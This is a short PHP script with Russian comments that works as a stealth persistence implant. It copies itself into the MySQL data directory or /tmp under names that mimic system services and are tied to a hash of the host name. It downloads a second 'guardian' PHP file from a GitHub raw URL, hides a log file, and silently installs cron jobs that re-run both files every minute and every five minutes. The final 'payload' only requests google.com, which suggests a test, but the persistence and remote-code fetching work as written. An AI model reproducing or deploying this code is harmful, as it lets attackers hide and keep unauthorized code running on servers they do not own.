<?php

$gitBaseUrl = "https://raw.githubusercontent.com/0pt1mist/crontab-test/main/";
$targetDir = "/var/lib/mysql/"; 
if (!is_dir($targetDir)) $targetDir = "/tmp/"; // Фолбэк если нет прав к mysql

function getStealthName($id) {
    $services = ['apache2', 'nginx', 'mysql', 'postfix', 'syslog', 'daemon'];
    $hostHash = substr(md5(gethostname()), 0, 4); // Привязка к конкретной машине
    return $services[$id] . "_" . $hostHash . ".php";
}

$name1 = getStealthName(0);
$name2 = getStealthName(2);

$path1 = $targetDir . $name1;
$path2 = $targetDir . $name2;
$logFile = $targetDir . ".mysql_cache_log";

function writeLog($msg) {
    global $logFile;
    $timestamp = date("Y-m-d H:i:s");
    file_put_contents($logFile, "[$timestamp] [Main]: $msg\n", FILE_APPEND);
}

if (__FILE__ !== $path1) {
    copy(__FILE__, $path1);
    chmod($path1, 0755);
}

if (!file_exists($path2)) {
    writeLog("Guardian file missing. Downloading from Git...");
    $content = @file_get_contents($gitBaseUrl . "file2.php");
    if ($content) {
        file_put_contents($path2, $content);
        chmod($path2, 0755);
        writeLog("Guardian file restored.");
    }
}

$cronJob1 = "* * * * * /usr/bin/php $path1 > /dev/null 2>&1";
$cronJob2 = "*/5 * * * * /usr/bin/php $path2 > /dev/null 2>&1";
$currentCron = shell_exec("crontab -l 2>/dev/null");

if (strpos($currentCron, $name1) === false || strpos($currentCron, $name2) === false) {
    $newCron = $currentCron . "\n" . $cronJob1 . "\n" . $cronJob2 . "\n";
    file_put_contents("/tmp/.cr", $newCron . "\n");
    shell_exec("crontab /tmp/.cr && rm /tmp/.cr");
    writeLog("Persistence established in crontab.");
}

$ch = curl_init("https://google.com");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 10);
curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
writeLog("Payload executed. Google status: $httpCode");
curl_close($ch);

?>
